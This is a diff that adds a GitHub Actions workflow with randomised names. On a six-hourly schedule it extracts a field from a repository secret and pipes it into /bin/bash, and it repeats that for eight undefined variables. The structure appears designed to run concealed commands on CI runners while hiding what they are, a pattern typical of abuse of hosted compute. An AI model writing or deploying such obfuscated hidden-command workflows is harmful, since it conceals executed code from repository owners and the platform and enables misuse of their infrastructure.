@@ -1,0 +1,25 @@
+name: yangxuanji7156
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yangxuanji7156
+        env:
+          ke6482: ${{ secrets.ke6482 }}
+        run: |
+          echo $ke6482 | jq -r .p0103 | /bin/bash
+          echo $dmkow39125 | jq -r .ftg53126 | /bin/bash
+          echo $nzf09 | jq -r .ypf041 | /bin/bash
+          echo $vzg152 | jq -r .l9 | /bin/bash
+          echo $gepmu853 | jq -r .lq7 | /bin/bash
+          echo $p5625 | jq -r .m832 | /bin/bash
+          echo $yzxj88729 | jq -r .pj039 | /bin/bash
+          echo $y51792 | jq -r .mme0 | /bin/bash
+          echo $vp56 | jq -r .hcjg2062 | /bin/bash
+
